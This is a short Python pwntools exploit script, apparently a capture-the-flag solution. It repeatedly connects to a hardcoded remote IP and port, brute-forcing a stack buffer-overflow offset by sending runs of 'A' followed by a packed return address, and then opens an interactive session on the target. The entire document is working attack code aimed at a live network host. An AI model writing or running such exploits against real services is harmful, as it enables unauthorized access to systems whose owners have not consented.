#!/usr/bin/python3
from pwn import *
import struct
ip   = '104.199.235.135'
prot = 2111

for i in range(800, 900):
	r = remote(ip, prot)
	try:
		print(i)
		target = ("A" * i + struct.pack("<Q", 0x0000000000400796))
		print(r.sendline())			#reciever:
		print(r.sendline(target))	#content:
		print(r.recvline())
		print(r.recvline())
		print(r.interactive())
	except:
		print('error')